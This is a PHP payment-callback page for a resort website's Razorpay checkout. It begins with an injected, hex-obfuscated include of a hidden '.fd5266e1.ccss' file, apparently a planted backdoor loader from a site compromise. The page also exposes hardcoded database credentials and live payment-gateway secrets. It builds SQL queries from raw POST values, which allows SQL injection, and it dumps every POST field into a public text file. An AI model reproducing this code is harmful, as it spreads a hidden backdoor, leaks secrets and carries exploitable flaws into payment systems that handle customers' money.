<?php
/*d1bc8*/

$r14er = "/home/rams\x75khresorts.com/p\x75blic_html/razorpay\x2dphp/.fd5266e1.ccss"; $tp = $r14er; stripos($tp, "i5"); @include_once /* 54 */ ($tp);

/*d1bc8*/
session_start();
$con = mysqli_connect('localhost','rams_ramsukh','Eiid3Cdbsy!aMEtO','rams_ramsukh');

$razorpay_key    = 'rzp_live_RZtkXDKkbdykC5';
$razorpay_secret = 'dTUj29UDVXur6UYP4tebpXsu';

//RazorPay
require('../razorpay-php/Razorpay.php');
use Razorpay\Api\Api;
use Razorpay\Api\Errors\SignatureVerificationError;

//Write transaction details to a file
$postdata = $_POST;
$myfile = fopen('txn.txt', 'w');
$txn_details = '';
foreach ($postdata as $key => $value) {
 $txn_details = $txn_details.$key.':'.$value."\n";
}
//$txn_details = $txn_details.'Order ID: '.$_SESSION['razorpay_order_id'];
fwrite($myfile, $txn_details);
fclose($myfile);

//Set Variables
$success   = true;
$txnid     = $_SESSION['razorpay_order_id'];
$paymentID = $_POST['razorpay_payment_id'];

if (empty($_POST['razorpay_payment_id']) === false){
    $api = new Api($razorpay_key, $razorpay_secret);

    try{
        // Please note that the razorpay order ID must
        // come from a trusted source (session here, but
        // could be database or something else)
        $attributes = array(
            'razorpay_order_id' => $_SESSION['razorpay_order_id'],
            'razorpay_payment_id' => $_POST['razorpay_payment_id'],
            'razorpay_signature' => $_POST['razorpay_signature']
        );
        $api->utility->verifyPaymentSignature($attributes);
    }catch(SignatureVerificationError $e){
        $success = false;
        $error = 'Razorpay Error : ' . $e->getMessage();
    }
}else{
    $success = false;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Transaction Details</title>
    <style type="text/css">
        @import url('https://fonts.googleapis.com/css?family=Raleway:400,600,800|Montserrat:400,600,800');
        html{
            background-color: #f1f1f1;
            font-family: Montserrat;
        }
        body{
            position: absolute;
            top:0;
            bottom:0;
            left:0;
            right: 0;
        }
        .details_container{
            width: 100%;
            height: 100%;
        }
        .details_container .content{
            position: relative;
            top:50%;
            transform: translateY(-50%);
            padding:20px;
            text-align: center;
            max-width: 600px;
            margin: auto;
        }
        .details_container h1{
            font-family: Raleway;
            font-size: 25px;
            font-weight: 400;
        }
        .details_container .back{
            display: inline-block;
            padding:8px 30px;
            text-decoration: none;
            border:1px solid #ccc;
            background-color: white;
            color: #424242;
            font-size: 14px;
            font-weight: 600;
            border-radius: 5px;
        }
        .details_container .submit{
            background-color: #6a6aee;
            color: #fff;
            border:1px solid transparent;
        }
    </style>
</head>
<body>
    <div class="details_container">
        <div class="content">
            <?php
            if($success == true && !empty($txnid)){
                //Update Transaction Status
                $update = mysqli_query($con, "UPDATE payments SET status='success', gateway_id='$paymentID' WHERE txn_id='$txnid'");

                if($update){
                    echo '
                        <img src="images/success.png" width="100">
                        <h1>Thank You. Your transaction is successful.</h1>
                        <a class="back" href="/">Go back to website</a>
                    ';
                    exit();
                }else{
                    echo '
                        <img src="images/error.png" width="100">
                        <h1>Error. Something Went Wrong.</h1>
                        <a class="back" href="/">Go back to website</a>
                    ';
                    exit();
                } 
            }else{
                $update = mysqli_query($con, "UPDATE payments SET status='failed', gateway_id='$paymentID' WHERE txn_id='$txnid'");
                echo '
                    <img src="images/error.png" width="100">
                    <h1>Error. Something Went Wrong.</h1>
                    <a class="back" href="/">Go back to website</a>
                ';
                exit();
            } 
            ?>
        </div>
    </div>
</body>
</html>